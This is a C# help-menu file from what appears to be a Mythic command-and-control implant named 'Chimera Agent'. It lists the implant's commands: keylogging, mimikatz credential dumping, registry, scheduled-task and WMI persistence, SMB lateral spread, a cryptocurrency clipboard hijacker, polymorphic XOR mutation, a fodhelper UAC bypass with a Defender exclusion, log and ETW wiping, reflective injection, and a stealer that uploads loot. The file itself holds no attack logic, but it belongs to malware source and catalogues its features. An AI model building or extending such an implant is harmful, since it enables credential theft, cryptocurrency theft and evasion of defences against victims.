using System;
using System.Text;

namespace Chimera.Commands
{
    public static class Help
    {
        public static string Execute()
        {
            var sb = new StringBuilder();
            sb.AppendLine("Chimera Agent — Available Commands");
            sb.AppendLine("===================================");
            sb.AppendLine("Staging dir: C:\\Users\\Public\\Chrome (hidden)");
            sb.AppendLine();

            sb.AppendLine("-- Recon --");
            sb.AppendLine("shell <cmd>                      Run a command via cmd /c");
            sb.AppendLine("ls [path]                        List directory contents");
            sb.AppendLine("pwd                              Print working directory");
            sb.AppendLine("cd <path>                        Change working directory");
            sb.AppendLine("ps                               List running processes (PID/user/arch)");
            sb.AppendLine("screenshot                       Capture desktop, upload to Mythic");
            sb.AppendLine();

            sb.AppendLine("-- Credentials --");
            sb.AppendLine("keylog start                     Install low-level keyboard hook");
            sb.AppendLine("keylog dump                      Return captured keystrokes so far");
            sb.AppendLine("keylog stop                      Stop hook, return all keystrokes");
            sb.AppendLine("mimikatz                         Dump creds via embedded mimikatz_enc");
            sb.AppendLine();

            sb.AppendLine("-- Persistence --");
            sb.AppendLine("persist                          Fileless XOR blob -> staging + HKCU Run");
            sb.AppendLine("persist remove                   Remove blob and Run key");
            sb.AppendLine("persist2 install                 Scheduled task (ONLOGON) persistence");
            sb.AppendLine("persist2 installwmi              WMI event subscription (on startup)");
            sb.AppendLine("persist2 remove                  Remove scheduled task + WMI objects");
            sb.AppendLine();

            sb.AppendLine("-- Lateral Movement --");
            sb.AppendLine("spread <ip> <user> <pass>        Copy agent + loader to remote via SMB,");
            sb.AppendLine("                                  create schtask on target (~30s beacon)");
            sb.AppendLine();

            sb.AppendLine("-- Loot Collection --");
            sb.AppendLine("collect                          Upload all *.zip from staging, then delete");
            sb.AppendLine();

            sb.AppendLine("-- Crypto Hijacking --");
            sb.AppendLine("clipper start                    Monitor clipboard, swap crypto addresses");
            sb.AppendLine("clipper stop                     Stop clipboard monitor");
            sb.AppendLine("clipper status                   Show state + swap count + addresses");
            sb.AppendLine();

            sb.AppendLine("-- Polymorphic Mutation --");
            sb.AppendLine("mutate [key_byte]                Re-encrypt agent.dat with new XOR key;");
            sb.AppendLine("                                  update Run key + persist2 task in place.");
            sb.AppendLine("                                  Omit key for random 0x42-0x7E.");
            sb.AppendLine();

            sb.AppendLine("-- Evasion / Elevation --");
            sb.AppendLine("bypass [cmd]                     UAC via fodhelper + Defender C:\\ exclusion");
            sb.AppendLine("clearlogs                        Stop EventLog+Sysmon, clear logs,");
            sb.AppendLine("                                  disable ETW providers, disable WerSvc");
            sb.AppendLine();

            sb.AppendLine("-- C2 Resilience --");
            sb.AppendLine("c2config secondary_url <url>     Add fallback callback host");
            sb.AppendLine("c2config secondary_url clear     Remove secondary URL");
            sb.AppendLine("c2config jitter <base> <range>   Sleep = base ± range seconds");
            sb.AppendLine("c2config jitter reset            Restore compiled-in defaults");
            sb.AppendLine("c2config ua_rotate on|off        Random UA each beacon (5 common BUAs)");
            sb.AppendLine("c2config status                  Show current C2 settings");
            sb.AppendLine();

            sb.AppendLine("-- Agent Health --");
            sb.AppendLine("check_health                     Audit staging dir, agent.dat, Run key,");
            sb.AppendLine("                                  persist2 task, WMI filter, XOR key state");
            sb.AppendLine();

            sb.AppendLine("-- Injection --");
            sb.AppendLine("inject_assembly <b64>            Reflectively load and run .NET assembly");
            sb.AppendLine("run_stealer                      Decrypt stealer_enc, exec, upload loot");
            sb.AppendLine();

            sb.AppendLine("-- File Transfer --");
            sb.AppendLine("upload <local> [remote]          Upload file from agent to Mythic");
            sb.AppendLine("download <url> <local>           Download file from Mythic to agent");
            sb.AppendLine("sleep <seconds> [jitter]         Change beacon interval");
            sb.AppendLine();

            sb.AppendLine("kill                             Terminate agent process");
            sb.AppendLine("help                             Show this menu");
            return sb.ToString();
        }
    }
}
